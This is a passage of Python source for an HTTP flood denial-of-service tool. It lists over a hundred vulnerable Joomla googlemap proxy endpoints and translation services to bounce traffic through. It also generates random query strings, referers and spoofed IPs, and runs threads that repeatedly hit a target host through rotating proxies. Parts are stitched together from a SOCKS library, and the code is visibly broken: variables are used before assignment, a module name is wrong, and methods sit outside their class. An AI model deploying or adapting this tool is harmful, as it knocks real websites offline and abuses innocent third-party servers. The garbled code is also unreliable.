        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://about42.nl/www/showheaders.php;POST;about42.nl.txt')
        headers_referers.append('http://browsershots.org;POST;browsershots.org.txt')
        headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
        headers_referers.append('http://www.comicgeekspeak.com/proxy.php?url=')
        headers_referers.append('http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt')
        headers_referers.append('http://web-sniffer.net/?url=')
        headers_referers.append('http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.net/tr-url/ru-uk.uk/')
        headers_referers.append('http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://' + host + '/')
        return(headers_referers)    
def keyword_list():
    global keyword_top
    keyword_top.append('Sex')
    keyword_top.append('Robin Williams')
    keyword_top.append('World Cup')
    keyword_top.append('Ca Si Le Roi')
    keyword_top.append('Ebola')
    keyword_top.append('Malaysia Airlines Flight 370')
    keyword_top.append('ALS Ice Bucket Challenge')
    keyword_top.append('Flappy Bird')
    keyword_top.append('Conchita Wurst')
    keyword_top.append('ISIS')
    keyword_top.append('Frozen')
    keyword_top.append('014 Sochi Winter Olympics')
    keyword_top.append('IPhone')
    keyword_top.append('Samsung Galaxy S5')
    keyword_top.append('Nexus 6')
    keyword_top.append('Moto G')
    keyword_top.append('Samsung Note 4')
    keyword_top.append('LG G3')
    keyword_top.append('Xbox One')
    keyword_top.append('Apple Watch')
    keyword_top.append('Nokia X')
    keyword_top.append('Ipad Air')
    keyword_top.append('Facebook')
    keyword_top.append('DVHT')
    keyword_top.append('VHS')
    keyword_top.append('THT')
    keyword_top.append('GLT')
    keyword_top.append('WT')
    keyword_top.append('LUX')
    keyword_top.append('Darius')
    keyword_top.append('Garen')
    keyword_top.append('Master Yi')
    keyword_top.append('Rengar')
    keyword_top.append('Katarina')
    keyword_top.append('Shen')
    keyword_top.append('Maphile')
    keyword_top.append('Support')
    keyword_top.append('Mid')
    keyword_top.append('Top')
    keyword_top.append('Bot')
    keyword_top.append('AD')
    keyword_top.append('Fucking')
    keyword_top.append('Diana')
    keyword_top.append('Kotex')
    keyword_top.append('BCS')
    keyword_top.append('ZingSpeed')
    keyword_top.append('Firerush')
    keyword_top.append('1Shot')
    keyword_top.append('TruyKich')
    keyword_top.append('IPhone')
    keyword_top.append('Star War')
    keyword_top.append('Windows 10')
    keyword_top.append('Zens Phone')
    keyword_top.append('Son Tung M-TP')
    keyword_top.append('Viurs')
    keyword_top.append('RIP Face')
    keyword_top.append('tao quan')
    keyword_top.append('gia xang')
    keyword_top.append('Roll Royce')
    keyword_top.append('Hai VL')
    keyword_top.append('Be Trang ss')
    keyword_top.append('FIFA')
    keyword_top.append('Bill Gate')
    keyword_top.append('UFO')
    keyword_top.append('Microsoft')
    keyword_top.append('Mark Zuckerberg')
    keyword_top.append('vietnam')
    keyword_top.append('singapore') 
    keyword_top.append('all 150')
    return(keyword_top)

class BaseHandler:
    handler_order = 500

    def add_parent(self, parent):
        self.parent = parent

    def close(self):
        # Only exists for backwards compatibility
        pass

    def __lt__(self, other):
        if not hasattr(other, "handler_order"):
            # Try to preserve the old behavior of having custom classes
            # inserted after default ones (works only for custom user
            # classes which are not aware of handler_order).
            return True
        return self.handler_order < other.handler_order


def _parse_proxy(proxy):
    """Return (scheme, user, password, host/port) given a URL or an authority.
    If a URL is supplied, it must have an authority (host:port) component.
    According to RFC 3986, having an authority component means the URL must
    have two slashes after the scheme.
    """
    scheme, r_scheme = _splittype(proxy)
    if not r_scheme.startswith("/"):
        # authority
        scheme = None
        authority = proxy
    else:
        # URL
        if not r_scheme.startswith("//"):
            raise ValueError("proxy URL with no authority: %r" % proxy)
        # We have an authority, so for RFC 3986-compliant URLs (by ss 3.
        # and 3.3.), path is empty or starts with '/'
        end = r_scheme.find("/", 2)
        if end == -1:
            end = None
        authority = r_scheme[2:end]
    userinfo, hostport = _splituser(authority)
    if userinfo is not None:
        user, password = _splitpasswd(userinfo)
    else:
        user = password = None
    return scheme, user, password, hostport

class ProxyHandler(BaseHandler):
    # Proxies must be in front
    handler_order = 100

    def __init__(self, proxies=None):
        if proxies is None:
            proxies = getproxies()
        assert hasattr(proxies, 'keys'), "proxies must be a mapping"
        self.proxies = proxies
        for type, url in proxies.items():
            setattr(self, '%s_open' % type,
                    lambda r, proxy=url, type=type, meth=self.proxy_open:
                        meth(r, proxy, type))

    def proxy_open(self, req, proxy, type):
        orig_type = req.type
        proxy_type, user, password, hostport = _parse_proxy(proxy)
        if proxy_type is None:
            proxy_type = orig_type

        if req.host and proxy_bypass(req.host):
            return None

        if user and password:
            user_pass = '%s:%s' % (unquote(user),
                                   unquote(password))
            creds = base64.b64encode(user_pass.encode()).decode("ascii")
            req.add_header('Proxy-authorization', 'Basic ' + creds)
        hostport = unquote(hostport)
        req.set_proxy(hostport, proxy_type)
        if orig_type == proxy_type or orig_type == 'https':
            # let other handlers take care of it
            return None
        else:
            # need to start over, because the other handlers don't
            # grok the proxy's URL type
            # e.g. if we have a constructor arg proxies like so:
            # {'http': 'ftp://proxy.example.com'}, we may end up turning
            # a request for http://acme.example.com/a into one for
            # ftp://proxy.example.com/a
            return self.parent.open(req, timeout=req.timeout)

    
#builds random asscii string
def buildblock(size):
    _LOWERCASE = range(97, 122)
    _UPPERCASE = range(65, 90)
    _NUMERIC   = range(48, 57)
    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
    for i in range(0, size):
        a = random.choice(validChars)
        out_str += chr(a)
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)
                                    
#http request
def httpcall(url):
        getUserAgent()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner = "&"
        else:
                param_joiner = "?"
        request = urllib2.requests.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(getUserAgent))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers)+random.choice(keyword_top))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        index = random.randint(0,len(listaproxy)-1)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        try:
                        urllib2.urlopen(request)
        except urllib2.HTTPError, e:
                        set_flag(1)
                        code=500
                        time.sleep(6)
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)
        index = random.randint(0,len(listaproxy)-1)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        return(code)
    
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass
#for i in xrange(1000):
#    t = HTTPThread()
#    t.start()
		
# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
                     for i in xrange(num_threads):                       
                         t = MonitorThread()
                         t.start()
                       
def randomIp():
    random.seed()
    result = str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    result = result + str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    return result

def generateip():
        notvalid = [10, 127, 169, 172, 192]
        first = randrange(1, 256)
        while first is notvalid:
            first = randrange(1, 256)
        _ip = ".".join([str(first), str(randrange(1, 256)),
        str(randrange(1, 256)), str(randrange(1, 256))])
        return _ip    

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(20, 80)):
        res = res + randomIp() + generateip() + ", "
    return res[0:len(res) - 2]

def randomReFerer():
    return random.choice(headers_referers)

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
        """setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
        Sets a default proxy which all further socksocket objects will use,
        unless explicitly changed.
        """
        global _defaultproxy
        _defaultproxy = (proxytype,addr,port,rdns,username,password)
       
class socksocket(socket.socket):
        """socksocket([family[, type[, proto]]]) -> socket object
       
        Open a SOCKS enabled socket. The parameters are the same as
        those of the standard socket init. In order for SOCKS to work,
        you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
        """
       
def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
                _orgsocket.__init__(self,family,type,proto,_sock)
                if _defaultproxy != None:
                        self.__proxy = _defaultproxy
                else:
                        self.__proxy = (None, None, None, None, None, None)
                self.__proxysockname = None
                self.__proxypeername = None
       
def __recvall(self, bytes):
                """__recvall(bytes) -> data
                Receive EXACTLY the number of bytes requested from the socket.
                Blocks until the required number of bytes have been received.
                """
                data = ""
                while len(data) < bytes:
                        data = data + self.recv(bytes-len(data))
                return data
       
def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
                """setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
                Sets the proxy to be used.
                proxytype -     The type of the proxy to be used. Three types
                                are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                                PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
                addr -          The address of the server (IP or DNS).
                port -          The port of the server. Defaults to 1080 for SOCKS
                                servers and 8080 for HTTP proxy servers.
                rdns -          Should DNS queries be preformed on the remote side
                                (rather than the local side). The default is True.
                                Note: This has no effect with SOCKS4 servers.
                username -      Username to authenticate with to the server.
                                The default is no authentication.
                password -      Password to authenticate with to the server.
                                Only relevant when username is also provided.
                """
                self.__proxy = (proxytype,addr,port,rdns,username,password)
       
def __negotiatesocks5(self,destaddr,destport):
                """__negotiatesocks5(self,destaddr,destport)
                Negotiates a connection through a SOCKS5 server.
                """
                # First we'll send the authentication packages we support.
                if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
                        # The username/password details were supplied to the
                        # setproxy method so we support the USERNAME/PASSWORD
                        # authentication (in addition to the standard none).
                        self.sendall("\x05\x02\x00\x02")
                else:
                        # No username/password were entered, therefore we
                        # only support connections with no authentication.
                        self.sendall("\x05\x01\x00")
                # We'll receive the server's response to determine which
                # method was selected
                chosenauth = self.__recvall(2)
                if chosenauth[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                # Check the chosen authentication method
                if chosenauth[1] == "\x00":
                        # No authentication is required
                        pass
                elif chosenauth[1] == "\x02":
                        # Okay, we need to perform a basic username/password
                        # authentication.
                        self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
                        authstat = self.__recvall(2)
                        if authstat[0] != "\x01":
                                # Bad response
                                self.close()
                                raise GeneralProxyError((1,_generalerrors[1]))
                        if authstat[1] != "\x00":
                                # Authentication failed
                                self.close()
                                raise Socks5AuthError,((3,_socks5autherrors[3]))
                        # Authentication succeeded
                else:
                        # Reaching here is always bad
                        self.close()
                        if chosenauth[1] == "\xFF":
                                raise Socks5AuthError((2,_socks5autherrors[2]))
                        else:
                                raise GeneralProxyError((1,_generalerrors[1]))
                # Now we can request the actual connection
                req = "\x05\x01\x00"
                # If the given destination address is an IP address, we'll
                # use the IPv4 address request even if remote resolving was specified.
                try:
                        ipaddr = socket.inet_aton(destaddr)
                        req = req + "\x01" + ipaddr
                except socket.error:
                        # Well it's not an IP number,  so it's probably a DNS name.
                        if self.__proxy[3]==True:
                                # Resolve remotely
                                ipaddr = None
                                req = req + "\x03" + chr(len(destaddr)) + destaddr
                        else:
                                # Resolve locally
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                                req = req + "\x01" + ipaddr
                req = req + struct.pack(">H",destport)
                self.sendall(req)
                # Get the response
                resp = self.__recvall(4)
                if resp[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                elif resp[1] != "\x00":
                        # Connection failed
                        self.close()
                        if ord(resp[1])<=8:
                                raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
                        else:
                                raise Socks5Error(9,_generalerrors[9])
                # Get the bound address/port
                elif resp[3] == "\x01":
                        boundaddr = self.__recvall(4)
                elif resp[3] == "\x03":
                        resp = resp + self.recv(1)
                        boundaddr = self.__recvall(resp[4])
                else:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                boundport = struct.unpack(">H",self.__recvall(2))[0]
                self.__proxysockname = (boundaddr,boundport)
                if ipaddr != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def getproxysockname(self):
                """getsockname() -> address info
                Returns the bound IP address and port number at the proxy.
                """
                return self.__proxysockname
       
def getproxypeername(self):
                """getproxypeername() -> address info
                Returns the IP and port number of the proxy.
                """
                return _orgsocket.getpeername(self)
       
def getpeername(self):
                """getpeername() -> address info
                Returns the IP address and port number of the destination
                machine (note: getproxypeername returns the proxy)
                """
                return self.__proxypeername
       
def __negotiatesocks4(self,destaddr,destport):
                """__negotiatesocks4(self,destaddr,destport)
                Negotiates a connection through a SOCKS4 server.
                """
                # Check if the destination address provided is an IP address
                rmtrslv = False
                try:
                        ipaddr = socket.inet_aton(destaddr)
                except socket.error:
                        # It's a DNS name. Check where it should be resolved.
                        if self.__proxy[3]==True:
                                ipaddr = "\x00\x00\x00\x01"
                                rmtrslv = True
                        else:
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                # Construct the request packet
                req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
                # The username parameter is considered userid for SOCKS4
                if self.__proxy[4] != None:
                        req = req + self.__proxy[4]
                req = req + "\x00"
                # DNS name if remote resolving is required
                # NOTE: This is actually an extension to the SOCKS4 protocol
                # called SOCKS4A and may not be supported in all cases.
                if rmtrslv==True:
                        req = req + destaddr + "\x00"
                self.sendall(req)
                # Get the response from the server
                resp = self.__recvall(8)
                if resp[0] != "\x00":
                        # Bad data
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if resp[1] != "\x5A":
                        # Server returned an error
                        self.close()
                        if ord(resp[1]) in (91,92,93):
                                self.close()
                                raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
                        else:
                                raise Socks4Error((94,_socks4errors[4]))
                # Get the bound address/port
                self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
                if rmtrslv != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def __negotiatehttp(self,destaddr,destport):
                """__negotiatehttp(self,destaddr,destport)
                Negotiates a connection through an HTTP server.
                """
                # If we need to resolve locally, we do this now
                if self.__proxy[3] == False:
                        addr = socket.gethostbyname(destaddr)
                else:
                        addr = destaddr
                self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
                # We read the response until we get the string "\r\n\r\n"
                resp = self.recv(1)
                while resp.find("\r\n\r\n")==-1:
                        resp = resp + self.recv(1)
                # We just need the first line to check if the connection
                # was successful
                statusline = resp.splitlines()[0].split(" ",2)
                if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                try:
                        statuscode = int(statusline[1])
                except ValueError:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if statuscode != 200:
                        self.close()
                        raise HTTPError((statuscode,statusline[2]))
                self.__proxysockname = ("0.0.0.0",0)
                self.__proxypeername = (addr,destport)
       
def connect(self,destpair):
